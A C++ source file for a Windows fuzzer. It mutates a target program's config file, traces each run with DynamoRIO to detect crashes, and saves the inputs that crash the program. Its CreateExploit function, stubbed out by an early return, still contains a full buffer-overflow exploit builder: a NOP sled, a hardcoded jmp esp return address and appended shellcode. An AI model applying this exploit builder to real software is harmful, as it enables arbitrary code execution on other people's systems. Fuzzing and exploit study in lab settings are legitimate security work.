#include <iostream>
#include <iomanip>
#include <random>
#include <fstream>
#include <string>
#include <sstream>
#include <filesystem>
#include <exception>

#include "fuzzer.h"
#include "utility.h"

// '(', '\"', ',' , ':', '=', ';', '^', ')'
std::vector<uint8_t>
MyProgram::Fuzzer::_divs = {
  0x28, 0x93, 0x2C, 0x3A, 0x3D, 0x3B, 0x94, 0x29
};

MyProgram::Fuzzer::
Fuzzer(
  const std::string& __exeName,
  const std::string& __confName
) : _data(),
    _exeName(__exeName),
    _confName(__confName),
    _dataChanged(true) {

  bool __res;

  __res = LoadConfig();
  if (!__res) {
    Backup();
    __res = LoadConfig();
    if (!__res) { throw std::runtime_error("loading config file failed"); }
  }
}

MyProgram::Fuzzer::~Fuzzer() = default;

// opt 1
void
MyProgram::Fuzzer::
AutoFuzzer(uint32_t __limitShift) {
  Backup();
  LoadConfig();

  _referenceTrace = _TraceRun();
  if (_referenceTrace.empty()) { return; }

  // Run program until all replacement occurs
  // byte
  {
    uint8_t __tmp;
    uint8_t __lowToMid = 0x00;
    uint8_t __midToLow = 0x7e;
    uint8_t __midToHigh = 0x7f;
    uint8_t __highToMid = 0xff;
    uint64_t __limit = UINT8_MAX >> __limitShift;
    uint8_t __cnt = 0;
    uint32_t __exitCode;

    for (size_t __pos = 0; __pos < _data.size(); ++__pos) {
      __cnt = 0;
      do {
        if (__lowToMid == 0x0f) {
          __lowToMid;
        }
        __tmp = _ChangeByte(__pos, __lowToMid, true);
        __exitCode = TraceRun();
        if (__exitCode) {
          _SaveCrashConfig(__pos, __lowToMid, __exitCode);
        } else { ++__cnt; }
        _ChangeByte(__pos, __tmp, false);
        ++__lowToMid;

        if (__cnt == __limit) { break; }

        __tmp = _ChangeByte(__pos, __midToLow, true);
        __exitCode = TraceRun();
        if (__exitCode) {
          _SaveCrashConfig(__pos, __midToLow, __exitCode);
        } else { ++__cnt; }
        _ChangeByte(__pos, __tmp, false);
        --__midToLow;

        if (__cnt == __limit) { break; }

        __tmp = _ChangeByte(__pos, __midToHigh, true);
        __exitCode = TraceRun();
        if (__exitCode) {
          _SaveCrashConfig(__pos, __midToHigh, __exitCode);
        } else { ++__cnt; }
        _ChangeByte(__pos, __tmp, false);
        ++__midToHigh;

        if (__cnt == __limit) { break; }

        __tmp = _ChangeByte(__pos, __highToMid, true);
        __exitCode = TraceRun();
        if (__exitCode) {
          _SaveCrashConfig(__pos, __highToMid, __exitCode);
        } else { ++__cnt; }
        _ChangeByte(__pos, __tmp, false);
        --__highToMid;

        if (__cnt == __limit) { break; }

      } while (__lowToMid < __midToLow && __midToHigh < __highToMid);
    }
  }

  // word
  {
    uint16_t __tmp;
    for (size_t __pos = 0; __pos < _data.size(); ++__pos) {
      uint16_t __val = 0;
      do {
        __tmp = _ChangeWord(__pos, __val, true);
        DryRun();
        // Backup
        _ChangeWord(__pos, __tmp, false);

        ++__val;
      } while (__val != 0);
    }
  }

  // dword
  {
    uint32_t __tmp;
    for (size_t __pos = 0; __pos < _data.size(); ++__pos) {
      uint32_t __val = 0;
      do {
        __tmp = _ChangeDWord(__pos, __val, true);
        DryRun();
        // Backup
        _ChangeDWord(__pos, __tmp, false);

        ++__val;
      } while (__val != 0);
    }
  }
}

// opt 2
void
MyProgram::Fuzzer::
ChangeBytes(size_t __offset, uint32_t __bytes, size_t __count) {
  size_t __len = _data.size();
  size_t __counter = 0;

  if (__len == 0) {
    _Log("Config file not loaded", true);
    return;
  }

  std::cout << __len << '\n';

  if (__offset > __len - 1) {
    _Log("Offset greater than file size", true);
    return;
  }

  if (__bytes <= 0xff) {
    uint8_t __tmp;
    for (size_t i = 0; i < __len - __offset; ++i) {
      __tmp = _data[__offset + i];
      _ChangeByte(__offset + i, uint8_t(__bytes), true);
      ++__counter;
      if (__counter >= __count && __count != 0) { break; }
    }
  } else if (__bytes > 0xff && __bytes <= 0xffff) {
    uint16_t __tmp;
    for (size_t i = 0; i < __len - __offset - 1; i+=2) {
      __tmp = (_data[__offset + i + 1] << 8) + _data[__offset + i];
      _ChangeWord(__offset + i, uint16_t(__bytes), true);
      ++__counter;
      if (__counter >= __count && __count != 0) { break; }
    }
  } else if (__bytes > 0xffff) {
    uint32_t __tmp;
    for (size_t i = 0; i < __len - __offset - 3; i+=4) {
      __tmp = (_data[__offset + i + 3] << 24) + (_data[__offset + i + 2] << 16)
        + (_data[__offset + i + 1] << 8) + _data[__offset + i];
      _ChangeDWord(__offset + i, __bytes, true);
      ++__counter;
      if (__counter >= __count && __count != 0) { break; }
    }
  }
}

void
MyProgram::Fuzzer::
ChangeRandBytes(size_t __offset, size_t __count) {
  size_t __len = _data.size();
  size_t __counter = 0;
  uint8_t __tmp;

  if (__len == 0) {
    _Log("Config file not loaded", true);
    return;
  }

  if (__offset > __len - 1) {
    _Log("Offset greater than file size", true);
    return;
  }

  for (size_t i = 0; i < __len - __offset; ++i) {
    __tmp = _RandomByte();
    _ChangeByte(__offset + i, __tmp, true);
    ++__counter;
    if (__counter >= __count && __count != 0) { break; }
  }
}

// opt 3
void
MyProgram::Fuzzer::
InsertByte(size_t __offset, uint8_t __code, size_t __count) {
  size_t __len = _data.size();
  std::stringstream __msg;
  if (__len == 0) {
    _Log("Config file not loaded", true);
    return;
  }
  __msg.fill('0');

  if (__len < __offset) {
    _data.insert(_data.end(), __count, __code);
    __msg << "Fuzzer add to end file " << __count << " bytes 0x"
      << std::hex << std::setw(2) << uint32_t(__code);
  }	else {
    _data.insert(_data.begin() + __offset, __count, __code);
    __msg << "Fuzzer add to offset: 0x" << std::setw(16)
      << std::hex << __offset << ' ' << std::dec << __count
      << " bytes 0x" << std::setw(2) << std::hex << uint32_t(__code);
  }

  _dataChanged = true;
  _Log(__msg.str(), true);
}

// opt 4
void
MyProgram::Fuzzer::
DeleteByte(size_t __offset, size_t __count) {
  std::vector<uint8_t> __deleted;
  std::stringstream __msg;
  size_t __len = _data.size();

  if (__len == 0) {
    _Log("Config file not loaded", true);
    return;
  }
  if (__offset > __len - 1) {
    _Log("Offset greater than file size", true);
    return;
  }

  auto __begIt = _data.begin() + __offset;
  auto __endIt = __begIt;

  if (__offset + __count > __len) {
    std::cout << "Count is to large... Removing bytes till EOF\n";
    __endIt = _data.end();
  } else { __endIt = __begIt + __count; }

  __deleted.assign(__begIt, __endIt);
  _data.erase(__begIt, __endIt);

  __msg.fill('0');

  __msg << "Fuzzer deleted " << __deleted.size() << " bytes from offset: 0x"
    << std::hex << std::setw(16) << __offset << " : " << std::dec;
  for (const auto& __el : __deleted) {
    __msg << " 0x" << std::setw(2) << std::hex << uint32_t(__el) << std::dec;
  }

  _dataChanged = true;
  _Log(__msg.str(), true);
}

void
MyProgram::Fuzzer::
InsertRandomByte(size_t __offset, size_t __count) {
  uint8_t __tmp;
  size_t __len = _data.size();
  std::stringstream __msg;
  if (__len == 0) {
    _Log("Config file not loaded", true);
    return;
  }
  __msg.fill('0');
  if (__len < __offset) {
    __msg << "Fuzzer insert random bytes to end of file:";
    for (size_t i = 0; i < __count; ++i) {
      __tmp = _RandomByte();
      __msg << " 0x" << std::setw(2) << std::hex << uint32_t(__tmp) << std::dec;
      _data.push_back(__tmp);
    }
  }	else {
    __msg << "Fuzzer insert random bytes to offset: 0x"
      << std::hex << std::setw(16) << __offset << " : " << std::dec;
    for (size_t i = 0; i < __count; ++i) {
      __tmp = _RandomByte();
      __msg << " 0x" << std::setw(2) << std::hex
        << uint32_t(__tmp) << " ";
      _data.insert(_data.begin() + __offset + i, 1, __tmp);
    }
  }

  _dataChanged = true;
  _Log(__msg.str(), true);
}

// opt 5
void
MyProgram::Fuzzer::
ExpandFields(size_t __offset, uint32_t __code, size_t __count) {
  __offset;
  __count;
  __code;
  //size_t __len = _data.size();
  //size_t __divLen = _divs.size();
  //size_t __pos = 0;
  //size_t __cnt= 0;

  //if (__len == 0) {
  //  _Log("Config file not loaded", true);
  //  return;
  //}
  //if (__divLen == 0) {
  //  _Log("Symbols for dividing fields not set", true);
  //  return;
  //}
  //__pos = _FindDividings(__offset);
  //if (__pos == __len + 1) {
  //  _Log("There is no dividing fields from offset", true);
  //  return;
  //}
  //do {
  //  std::stringstream __msg;
  //  __msg.fill('0');
  //  if (__code <= 0xff) {
  //    _data.insert(_data.begin() + __pos, 1, uint8_t(__code));
  //    __msg << "Expand field at offset: 0x" << std::setw(16) << std::hex << __pos
  //      << " - byte 0x" << std::setw(2) << uint8_t(__code);
  //    __pos += 2;
  //    ++__cnt;
  //    _Log(__msg.str(), true);
  //    if (__cnt == __count) { break; }
  //  } else if ((__code > 0xff) && (__code <= 0xffff)) {
  //    _data.insert(_data.begin() + __pos, 1, uint8_t(__code));
  //    _data.insert(_data.begin() + __pos + 1, 1, uint8_t(__code >> 8));
  //    __msg << "Expand field at offset: 0x" << std::setw(16) << std::hex << __pos
  //      << " - word 0x" << std::setw(4) << uint16_t(__code);
  //    __pos += 3;
  //    ++__cnt;
  //    _Log(__msg.str(), true);
  //    if (__cnt == __count) { break; }
  //  } else if (__code > 0xffff) {
  //    _data.insert(_data.begin() + __pos, 1, uint8_t(__code));
  //    _data.insert(_data.begin() + __pos + 1, 1, uint8_t(__code >> 8));
  //    _data.insert(_data.begin() + __pos + 2, 1, uint8_t(__code >> 16));
  //    _data.insert(_data.begin() + __pos + 3, 1, uint8_t(__code >> 24));
  //    __msg << "Expand field at offset: 0x" << std::setw(16) << std::hex << __pos
  //      << " - dword 0x" << std::setw(8) << uint32_t(__code);
  //    __pos += 5;
  //    ++__cnt;
  //    _Log(__msg.str(), true);
  //    if (__cnt == __count) { break; }
  //  }
  //  __len = _data.size();
  //  __pos = _FindDividings(__pos);
  //} while (__pos <= __len);
  _dataChanged = true;
}

void
MyProgram::Fuzzer::
ExpandFieldsRandom(size_t __offset, size_t __count) {
  uint8_t __size = _RandomByte();
  uint32_t __tmp = 0;
  if (__size < 0x40) { __tmp = _RandomByte(); }
  else if (__size < 0x80) {
    __tmp = (_RandomByte() << 8) + _RandomByte();
  } else if (__size < 0xc0) {
    __tmp = (_RandomByte() << 16) + (_RandomByte() << 8) + _RandomByte();
  } else {
    __tmp = (_RandomByte() << 24) + (_RandomByte() << 16)
      + (_RandomByte() << 8) + _RandomByte();
  }
  ExpandFields(__offset, __tmp, __count);
}

// opt 6
BOOL
MyProgram::Fuzzer::
DryRun() {
  BOOL __res = FALSE;

  SaveConfig();

  MyProgram::Debugger __debugger(_exeName, "");
  __res = __debugger.DryRun();

  return __res;
}

uint32_t
MyProgram::Fuzzer::
TraceRun() {
  std::vector<uint64_t> __trace = _TraceRun();
  DWORD exitCode;

  if (__trace.empty()) { return uint32_t(-1); }

  exitCode = uint32_t(__trace.back());

  // Compare traces
  if (_referenceTrace.size() == __trace.size()) {
    // Compare exit codes
    if (_referenceTrace.back() != exitCode) { return exitCode; }

    // Otherwise compare trace
    auto __refBeg = _referenceTrace.cbegin();
    auto __refEnd = _referenceTrace.cend();
    auto __curBeg = __trace.cbegin();
    auto __curEnd = __trace.cend();

    while (__refBeg != __refEnd && __curBeg != __curEnd) {
      if (*__refBeg != *__curBeg) { return uint32_t(-1); }

      ++__refBeg;
      ++__curBeg;
    }
  } else if (exitCode == _referenceTrace.back()) {
    exitCode = uint32_t(-1);
  }
  
  return exitCode;
}

// opt 8
void
MyProgram::Fuzzer::
CreateExploit() {

  std::cout << "To be continued..." << std::endl;
  return;

  std::vector<uint8_t> _shellcode;
  std::fstream __shellFile(
    "shellcode.bin",
    std::fstream::in | std::fstream::binary
  );

  if (!__shellFile.is_open()) {
    _Log("Cannot open shellcode file", true);
    return;
  }

  __shellFile.seekg(0, __shellFile.end);
  auto __length = __shellFile.tellg();
  __shellFile.seekg(0, __shellFile.beg);

  _shellcode.clear();
  _shellcode.reserve(size_t(__length));

  for (size_t i = 0; i < __length; ++i) {
    _shellcode.push_back(uint8_t(__shellFile.get()));
  }

  __shellFile.close();

  if (_shellcode.size() != __length) { return; }

  // start from initial config
  Backup();
  LoadConfig();

  DeleteByte(size_t(0x30), _data.size() - 0x30);

  InsertByte(size_t(0x30), 0x90, 3016);

  // 0x62501297 - jmp esp addr
  ChangeBytes(size_t(3012 + 0x30), 0x62501297, 1);

  _data.insert(_data.end(), _shellcode.begin(), _shellcode.end());

  ChangeBytes(0x10, _data.size() -  0x30, 1);

  SaveConfig();
}

// opt 8
void
MyProgram::Fuzzer::
Backup() {
  std::string __backupDir(BACKUP_DIR);
  std::string __programDir(PROGRAM_DIR);
  std::string __dllName(DLL_NAME);

  std::filesystem::copy_file(
    __backupDir + '\\' + _exeName,
    __programDir + '\\' + _exeName,
    std::filesystem::copy_options::overwrite_existing
  );
  std::filesystem::copy_file(
    __backupDir + '\\' + _confName,
    __programDir + '\\' + _confName,
    std::filesystem::copy_options::overwrite_existing
  );
  std::filesystem::copy_file(
    __backupDir + '\\' + __dllName,
    __programDir + '\\' + __dllName,
    std::filesystem::copy_options::overwrite_existing
  );
}

bool
MyProgram::Fuzzer::
LoadConfig() {
  std::string __confPath(PROGRAM_DIR);
  __confPath += '\\' + _confName;
  std::ifstream __cfgFile(__confPath, std::ios::binary);
  if (__cfgFile.is_open()) {

    __cfgFile.seekg(0, __cfgFile.end);
    auto __length = __cfgFile.tellg();
    __cfgFile.seekg(0, __cfgFile.beg);

    _data.clear();
    _data.reserve(size_t(__length));

    for (size_t i = 0; i < __length; ++i) {
      _data.push_back(uint8_t(__cfgFile.get()));
    }

    __cfgFile.close();

    _dataChanged = true;

    if (_data.size() != __length) { return false; }
  }
  else {
    _Log("Cannot open config file", true);
    return false;
  }

  return true;
}

// opt 9
bool
MyProgram::Fuzzer::
SaveConfig() {
  std::string __confPath(PROGRAM_DIR);

  __confPath += '\\' + _confName;
  return _SaveConfig(__confPath);
}

//opt 10
void
MyProgram::Fuzzer::
PrintFields() {
  if (_data.empty()) {
    _Log("Config file not loaded", true);
    return;
  }

  if (_divs.empty()) {
    _Log("Symbols for dividing fields not set", true);
    return;
  }

  _FindFields();

  size_t __fieldsSize = _fields.size();
  for (size_t i = 0; i < __fieldsSize; ++i) {
    std::stringstream __msg;
    __msg.fill('0');
    __msg << "Field #" << i + 1 << " found - offset: 0x" << std::setw(16)
      << std::hex << _fields[i];
    _Log(__msg.str(), true);

  }
}

// opt 12
void
MyProgram::Fuzzer::
PrintConfig() {
  auto __prev = std::cout.fill('0');
  for (const auto& __el : _data) {
    std::cout << std::setw(2) << std::hex << uint16_t(__el) << ' ';
  }
  std::cout.fill(__prev);
  std::cout << '\n';
}

uint8_t
MyProgram::Fuzzer::
_ChangeByte(size_t __offset, uint8_t __code, bool __verbose) {
  std::stringstream __msg;
  uint8_t __tmp = _data[__offset];

  __msg.fill('0');
  __msg << "Offset: 0x" << std::hex << std::setw(16) << __offset
    << " fuzzer change BYTE from 0x" << std::setw(2) << uint32_t(__tmp)
    << " to 0x" << std::setw(2) << uint32_t(__code);

  _data[__offset] = __code;

  if (__verbose) { _Log(__msg.str(), true); }

  _dataChanged = true;
  return __tmp;
}

uint16_t
MyProgram::Fuzzer::
_ChangeWord(size_t __offset, uint16_t __code, bool __verbose) {
  std::stringstream __msg;
  uint16_t __tmp = (_data[__offset + 1] << 8) + _data[__offset];

  __msg.fill('0');
  __msg << "Offset: 0x" << std::hex << std::setw(16) << __offset
    << " fuzzer change WORD from 0x" << std::setw(4) << uint32_t(__tmp)
    << " to 0x" << std::setw(4) << uint32_t(__code);

  uint8_t __low = uint8_t(__code);
  uint8_t __high = uint8_t(__code >> 8);

  _data[__offset] = __low;
  _data[__offset + 1] = __high;

  if (__verbose) { _Log(__msg.str(), true); }

  _dataChanged = true;
  return __tmp;
}

uint32_t
MyProgram::Fuzzer::
_ChangeDWord(size_t __offset, uint32_t __code, bool __verbose) {
  std::stringstream __msg;
  uint32_t __tmp = (_data[__offset + 3] << 24) + (_data[__offset + 2] << 16)
    + (_data[__offset + 1] << 8) + _data[__offset];

  __msg.fill('0');
  __msg << "Offset: 0x" << std::hex << std::setw(16) << __offset
    << " fuzzer change DWORD from 0x" << std::setw(8) << __tmp
    << " to 0x" << std::setw(8) << __code;

  _data[__offset]		= uint8_t(__code);
  _data[__offset + 1]	= uint8_t(__code >> 8);
  _data[__offset + 2]	= uint8_t(__code >> 16);
  _data[__offset + 3]	= uint8_t(__code >> 24);

  if (__verbose) { _Log(__msg.str(), true); }

  _dataChanged = true;
  return __tmp;
}

void
MyProgram::Fuzzer::
_FindFields() {
  size_t __dataSize = _data.size();
  size_t __pos = 0x00;

  // No recalculations required
  if (!_dataChanged) { return; }

  if (_data.empty()) { _fields.clear(); }

  _fields.reserve(16);

  // At least one field in non-empty file
  _fields.push_back(__pos);

  for (; __pos < __dataSize; ++__pos) {
    for (const auto& div : _divs) {
      if (_data[__pos] == div) {
        if (__pos + 1 < __dataSize) {
          _fields.push_back(__pos + 1);
        }
        break;
      }
    }
  }

  _dataChanged = false;
}

// Search drrun.exe in PATH
std::string
MyProgram::Fuzzer::
_FindDrrun() {
  CHAR* __pathEnv = NULL;
  std::string __drrun("drrun.exe");
  std::vector<std::string> __paths;
  std::string __currPath;
  std::stringstream __msg;
  DWORD __dwRes;

  __msg.fill('0');

  __dwRes = GetFileAttributesA(__drrun.data());
  if (__dwRes != INVALID_FILE_ATTRIBUTES) { return __drrun; }

  __pathEnv = new(std::nothrow) CHAR[UINT16_MAX];
  if (__pathEnv == NULL) { return {}; }

  __dwRes = GetEnvironmentVariableA("PATH", __pathEnv, UINT16_MAX);
  if (!__dwRes) { return {}; }

  { 
    std::string __tmp;
    std::stringstream __path(__pathEnv); 
    while (std::getline(__path, __tmp, ';')) {
      if (__tmp.length() > 2) { __paths.push_back(std::move(__tmp)); }
    }
  }

  delete[] __pathEnv;

  for (const auto& path : __paths) {
    __currPath = path + '\\' + __drrun;
    __dwRes = GetFileAttributesA(__currPath.data());
    if (__dwRes != INVALID_FILE_ATTRIBUTES) { return __currPath; }
  }

  return {};
}

std::vector<uint64_t>
MyProgram::Fuzzer::
_TraceRun() {
  BOOL __res = FALSE;
  CHAR __coverageDllPath[MAX_PATH] = { 0x00 };
  CHAR __logDir[MAX_PATH] = { 0x00 };
  std::string __drrunPath;
  std::string __options;
  std::stringstream __msg;

  __msg.fill('0');

  __drrunPath = _FindDrrun();
  if (__drrunPath.empty()) {
    __msg << "Finding drrun.exe failed. Error: 0x" << std::hex
      << std::setw(8) << 0;
    _Log(__msg.str(), true);
    return {};
  }

  __res = GetFullPathNameA(
    COVERAGE_DLL_PATH, MAX_PATH, __coverageDllPath, NULL
  );
  if (!__res) {
    __msg << "GetFullPathName failed. Error: 0x" << std::hex
      << std::setw(8) << GetLastError();
    _Log(__msg.str(), true);
    return {};
  }

  __res = GetFullPathNameA(LOG_DIR, MAX_PATH, __logDir, NULL);
  if (!__res) {
    __msg << "GetFullPathName failed. Error: 0x" << std::hex
      << std::setw(8) << GetLastError();
    _Log(__msg.str(), true);
    return {};
  }

  SaveConfig();

  __options.reserve(256);
  __options += "-c ";
  __options += __coverageDllPath;
  __options += " -target_module ";
  __options += _exeName;
  __options += " -target_module ";
  __options += DLL_NAME;
  __options += " -fuzz_module ";
  __options += _exeName;
  __options += " -fuzz_method main";
  __options += " -log_dir ";
  __options += __logDir;
  __options += " -- ";
  __options += _exeName;

  MyProgram::Debugger __debugger(__drrunPath, __options);
  __res = __debugger.DryRun();

  return __debugger.GetTrace();
}

bool
MyProgram::Fuzzer::
_SaveCrashConfig(size_t __offset, uint8_t __val, uint32_t __exitCode) {
  std::stringstream __strVal;
  
  __strVal.fill('0');
  __strVal << std::hex << "0x" << std::setw(2) << uint32_t(__val);

  return _SaveCrashConfig(__offset, __strVal.str(), __exitCode);
}

bool
MyProgram::Fuzzer::
_SaveCrashConfig(size_t __offset, uint16_t __val, uint32_t __exitCode) {
  std::stringstream __strVal;
  
  __strVal.fill('0');
  __strVal << std::hex << "0x" << std::setw(4) << __val;

  return _SaveCrashConfig(__offset, __strVal.str(), __exitCode);
}

bool
MyProgram::Fuzzer::
_SaveCrashConfig(size_t __offset, uint32_t __val, uint32_t __exitCode) {
  std::stringstream __strVal;
  
  __strVal.fill('0');
  __strVal << std::hex << "0x" << std::setw(8) << __val;

  return _SaveCrashConfig(__offset, __strVal.str(), __exitCode);
}

bool
MyProgram::Fuzzer::
_SaveCrashConfig(size_t __offset, std::string __val, uint32_t __exitCode) {
  std::string __filePath(CRASH_CONFIGS_DIR);
  std::stringstream __fileName(_confName);

  if (!std::filesystem::exists(__filePath)) {
    std::filesystem::create_directories(__filePath);
  }

  __fileName.fill('0');
  __fileName << std::hex << "0x" << std::setw(8) << uint64_t(__offset)
    << '_' << __val << '_';

  switch (__exitCode) {
    case EXCEPTION_ACCESS_VIOLATION:
        __fileName << "EXCEPTION_ACCESS_VIOLATION";
        break;
      case EXCEPTION_ARRAY_BOUNDS_EXCEEDED:
        __fileName << "EXCEPTION_ARRAY_BOUNDS_EXCEEDED";
        break;
      case EXCEPTION_DATATYPE_MISALIGNMENT:
        __fileName << "EXCEPTION_DATATYPE_MISALIGNMENT";
        break;
      case EXCEPTION_FLT_DENORMAL_OPERAND:
        __fileName << "EXCEPTION_FLT_DENORMAL_OPERAND";
        break;
      case EXCEPTION_FLT_DIVIDE_BY_ZERO:
        __fileName << "EXCEPTION_FLT_DIVIDE_BY_ZERO";
        break;
      case EXCEPTION_FLT_INEXACT_RESULT:
        __fileName << "EXCEPTION_FLT_INEXACT_RESULT";
        break;
      case EXCEPTION_FLT_INVALID_OPERATION:
        __fileName << "EXCEPTION_FLT_INVALID_OPERATION";
        break;
      case EXCEPTION_FLT_OVERFLOW:
        __fileName << "EXCEPTION_FLT_OVERFLOW";
        break;
      case EXCEPTION_FLT_STACK_CHECK:
        __fileName << "EXCEPTION_FLT_STACK_CHECK";
        break;
      case EXCEPTION_FLT_UNDERFLOW:
        __fileName << "EXCEPTION_FLT_UNDERFLOW";
        break;
      case EXCEPTION_ILLEGAL_INSTRUCTION:
        __fileName << "EXCEPTION_ILLEGAL_INSTRUCTION";
        break;
      case EXCEPTION_IN_PAGE_ERROR:
        __fileName << "EXCEPTION_IN_PAGE_ERROR";
        break;
      case EXCEPTION_INT_DIVIDE_BY_ZERO:
        __fileName << "EXCEPTION_INT_DIVIDE_BY_ZERO";
        break;
      case EXCEPTION_INT_OVERFLOW:
        __fileName << "EXCEPTION_INT_OVERFLOW";
        break;
      case EXCEPTION_INVALID_DISPOSITION:
        __fileName << "EXCEPTION_INVALID_DISPOSITION";
        break;
      case EXCEPTION_NONCONTINUABLE_EXCEPTION:
        __fileName << "EXCEPTION_NONCONTINUABLE_EXCEPTION";
        break;
      case EXCEPTION_PRIV_INSTRUCTION:
        __fileName << "EXCEPTION_PRIV_INSTRUCTION";
        break;
      case EXCEPTION_SINGLE_STEP:
        __fileName << "EXCEPTION_SINGLE_STEP";
        break;
      case EXCEPTION_STACK_OVERFLOW:
        __fileName << "EXCEPTION_STACK_OVERFLOW";
        break;
      case -1:
        __fileName << "DIFFERENT_TRACE";
        break;
  }

  __fileName << ".cfg";

  __filePath += '\\' + __fileName.str();
  return _SaveConfig(__filePath);
}

bool
MyProgram::Fuzzer::
_SaveConfig(std::string __fileName) {
  if (_data.empty()) {
    _Log("Config file not loaded", true);
    return false;
  }

  std::ofstream __cfgFile(
    __fileName,
    std::ofstream::binary | std::ofstream::out | std::ofstream::trunc
  );

  if (!__cfgFile.is_open()) {
    _Log("Cannot open output config file", true);
    return false;
  }

  for (const auto& __el : _data) { __cfgFile << __el; }

  __cfgFile.close();

  return true;
}

uint8_t
MyProgram::Fuzzer::
_RandomByte(){
  static std::default_random_engine __gen;
  std::uniform_int_distribution<> __dist(0, 0xff);
  return uint8_t(__dist(__gen));
}

void
MyProgram::Fuzzer::
_Log(const std::string& __msg, bool __verbose) {
  static std::string __log(LOG_FILE_PATH);
  if (__verbose) { std::cout << __msg << "\n"; }
  MyProgram::Log(__log, __msg);
}
